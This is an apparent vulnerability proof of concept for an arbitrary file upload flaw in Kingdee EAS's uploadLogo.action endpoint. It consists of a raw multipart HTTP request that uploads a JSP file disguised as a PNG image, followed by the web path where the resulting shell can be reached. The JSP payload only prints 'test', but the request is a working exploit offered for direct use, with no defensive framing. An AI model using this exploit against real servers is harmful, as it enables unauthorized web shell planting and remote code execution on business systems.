# kindee_eas_easc_uploadLogo_fileupload

2024/1/29 @2
from: https://mp.weixin.qq.com/s/HTREdrnoMt5WCuKlhx8yeg
```
POST /plt_portal/setting/uploadLogo.action HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=04844569c7ca7d21a3ca115dca477d62
 
--04844569c7ca7d21a3ca115dca477d62
Content-Disposition: form-data; name="chooseLanguage_top"; filename="chooseLanguage_top"
 
ab
--04844569c7ca7d21a3ca115dca477d62
Content-Disposition: form-data; name="dataCenter"; filename="dataCenter"
 
ac
--04844569c7ca7d21a3ca115dca477d62
Content-Disposition: form-data; name="insId"; filename="insId"
 
 
--04844569c7ca7d21a3ca115dca477d62
Content-Disposition: form-data; name="type"; filename="type"
 
ad
--04844569c7ca7d21a3ca115dca477d62
Content-Disposition: form-data; name="upload"; filename="1.jsp"
Content-Type: image/png
 
<%out.print("test");%>
--04844569c7ca7d21a3ca115dca477d62--
```
check response to get filename

shell: /portal/res/file/upload/{filename}.jsp
